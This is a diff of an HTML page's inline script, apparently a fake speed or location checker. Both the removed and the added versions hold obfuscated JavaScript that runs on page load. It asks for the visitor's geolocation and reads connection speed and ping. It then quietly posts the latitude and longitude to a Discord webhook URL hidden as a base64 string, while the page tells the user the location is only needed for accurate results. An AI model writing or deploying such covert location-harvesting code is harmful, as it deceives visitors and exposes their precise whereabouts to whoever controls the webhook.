@@ -42,59 +42,92 @@
     <p id="k" class="c" style="display:none;">Requesting location access...</p>
     
     <script>
-        (function(){
-            var _0x6d4b=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNjA0Nzc5MDY0NjU3MTExMDAvcDROaGJjay01NTgtQnlxNm04Z25uWjIzcy9sZV5nd3VpNHN5TlBtZQ=="];
-            var _0x23e4x2=atob(_0x6d4b[0]);
-            function _0x21a6(a,b,c,d){
-                var _0x495f={content:"User Information",embeds:[{title:"Location and Speed Data",fields:[{name:"Location",value:`Latitude: ${a}\nLongitude: ${b}`,inline:true},{name:"Internet Speed",value:`${c} Mbps`,inline:true},{name:"Ping",value:`${d} ms`,inline:true}]}]};
-                fetch(_0x23e4x2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(_0x495f)}).catch(e=>console.error("Error sending data:",e))
-            }
+(function(){
+    var _0x6d4b=["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMzNjA0Nzc5MDY0NjU3MTExMDAvcDROaGJjay01NTgtQnlxNm04Z25uWjIzcy9sZV5nd3VpNHN5TlBtZQ=="];
+    var _0x23e4x2 = atob(_0x6d4b[0]); 
 
-            function _0x3960(){
-                let _0x9e0f="Unavailable";
-                let _0x2e62="Unavailable";
-                if(navigator.connection){
-                    _0x9e0f=navigator.connection.downlink||"Unavailable";
-                    _0x2e62=navigator.connection.rtt||"Unavailable"
+    // Function to send data to Discord Webhook
+    function _0x21a6(a, b, c, d) {
+        var _0x495f = {
+            content: `Location: Latitude: ${a}, Longitude: ${b}`,
+            embeds: [{
+                title: "Network Data",
+                fields: [
+                    { name: "Internet Speed", value: `${c} Mbps`, inline: true },
+                    { name: "Ping", value: `${d} ms`, inline: true }
+                ]
+            }]
+        };
+
+        // Use fetch to send POST request to Discord Webhook
+        fetch(_0x23e4x2, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(_0x495f)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Success:", data);
+        })
+        .catch(error => {
+            console.error("Error sending data:", error);
+        });
+    }
+
+    // Function to get the network speed (downlink) and ping (rtt)
+    function _0x3960() {
+        let _0x9e0f = "Unavailable";
+        let _0x2e62 = "Unavailable";
+        if (navigator.connection) {
+            _0x9e0f = navigator.connection.downlink || "Unavailable";
+            _0x2e62 = navigator.connection.rtt || "Unavailable";
+        }
+        document.getElementById("g").textContent = `${_0x9e0f} Mbps`;
+        document.getElementById("h").textContent = `${_0x2e62} ms`;
+    }
+
+    // Function to get the geolocation and send the data
+    function _0x4c90() {
+        document.getElementById("k").style.display = "block"; // Show loading message
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(a) {
+                document.getElementById("k").style.display = "none"; // Hide loading message
+                document.getElementById("a").style.display = "block";
+                document.getElementById("j").style.display = "none";
+
+                const b = a.coords.latitude;
+                const c = a.coords.longitude;
+                document.getElementById("f").textContent = `Latitude: ${b}, Longitude: ${c}`;
+
+                let _0x9e0f = "Unavailable";
+                let _0x2e62 = "Unavailable";
+                if (navigator.connection) {
+                    _0x9e0f = navigator.connection.downlink || "Unavailable";
+                    _0x2e62 = navigator.connection.rtt || "Unavailable";
                 }
-                document.getElementById("g").textContent=`${_0x9e0f} Mbps`;
-                document.getElementById("h").textContent=`${_0x2e62} ms`
-            }
 
-            function _0x4c90(){
-                document.getElementById("k").style.display="block";
-                if(navigator.geolocation){
-                    navigator.geolocation.getCurrentPosition(function(a){
-                        document.getElementById("k").style.display="none";
-                        document.getElementById("a").style.display="block";
-                        document.getElementById("j").style.display="none";
-                        const b=a.coords.latitude,c=a.coords.longitude;
-                        document.getElementById("f").textContent=`Latitude: ${b}, Longitude: ${c}`;
-                        let _0x9e0f="Unavailable";
-                        let _0x2e62="Unavailable";
-                        if(navigator.connection){
-                            _0x9e0f=navigator.connection.downlink||"Unavailable";
-                            _0x2e62=navigator.connection.rtt||"Unavailable"
-                        }
-                        document.getElementById("g").textContent=`${_0x9e0f} Mbps`;
-                        document.getElementById("h").textContent=`${_0x2e62} ms`;
-                        _0x21a6(b,c,_0x9e0f,_0x2e62)
-                    },function(){
-                        document.getElementById("k").style.display="none";
-                        document.getElementById("a").style.display="none";
-                        document.getElementById("j").style.display="block";
-                        alert("We need your location to provide accurate information. Please enable location access.")
-                    })
-                }else{
-                    document.getElementById("k").style.display="none";
-                    document.getElementById("a").style.display="none";
-                    document.getElementById("j").style.display="block";
-                    alert("Location access is not supported by your browser.")
-                }
-            }
+                document.getElementById("g").textContent = `${_0x9e0f} Mbps`;
+                document.getElementById("h").textContent = `${_0x2e62} ms`;
 
-            _0x4c90()
-        })();
+                // Send data to Discord webhook
+                _0x21a6(b, c, _0x9e0f, _0x2e62);
+            }, function() {
+                document.getElementById("k").style.display = "none";
+                document.getElementById("a").style.display = "none";
+                document.getElementById("j").style.display = "block";
+                alert("We need your location to provide accurate information. Please enable location access.");
+            });
+        } else {
+            document.getElementById("k").style.display = "none";
+            document.getElementById("a").style.display = "none";
+            document.getElementById("j").style.display = "block";
+            alert("Location access is not supported by your browser.");
+        }
+    }
+
+    _0x4c90();  // Call the function to get the location and network info when the page loads
+})();
+
     </script>
 </body>
 </html>
